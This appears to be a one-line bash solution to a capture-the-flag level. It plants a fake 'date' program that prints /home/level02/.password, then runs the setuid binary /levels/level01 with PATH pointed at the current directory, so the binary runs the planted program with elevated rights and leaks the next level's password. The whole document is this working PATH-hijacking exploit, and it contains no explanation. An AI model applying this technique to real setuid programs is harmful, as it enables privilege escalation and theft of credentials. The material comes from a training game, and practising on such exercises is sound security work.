#!/usr/bin/env bash
echo "/bin/cat /home/level02/.password" | cat > date; chmod 755 date; PATH=./ /levels/level01 | cut -d' ' -f3
